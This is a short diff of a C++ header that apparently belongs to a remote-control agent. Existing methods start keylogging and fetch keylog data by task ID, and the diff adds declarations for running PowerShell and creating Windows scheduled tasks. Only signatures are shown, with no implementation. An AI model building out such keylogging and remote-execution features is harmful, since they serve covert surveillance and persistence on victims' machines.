@@ -34,6 +34,9 @@ public:
 	Response keylog_start(const int &taskID, const keyloggerStartRequest &keyloggerStartRequest);
 	Response get_keylog_data(const int &taskID, const keyloggerStopRequest &keyloggerStopRequest);
 
+
+	Response ExecutePowerShell(const int& taskID, const CommandPowershell& request);
+	Response CreateWindowsTaskW(const int& taskID, const CommandWinTask& request);
 private:
 	CommManager commManager;
 	TaskQueueManager taskManager;
